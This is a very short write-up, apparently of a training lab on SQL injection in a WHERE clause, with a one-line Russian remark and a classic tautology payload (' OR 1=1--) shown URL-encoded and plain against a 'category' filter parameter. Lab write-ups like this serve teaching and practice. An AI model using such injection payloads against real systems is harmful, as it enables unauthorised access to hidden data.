# SQL injection vulnerability in WHERE clause allowing retrieval of hidden data WRITEUP

Ничего интересного, использовался стандартейший payload с верным условием, закрытием прошлого условия и комментарием

## Payload

```bash
filter?category=%27%20OR%201=1--
```

```bash
filter?category=' OR 1=1--
```

![Пикча](fig.png)
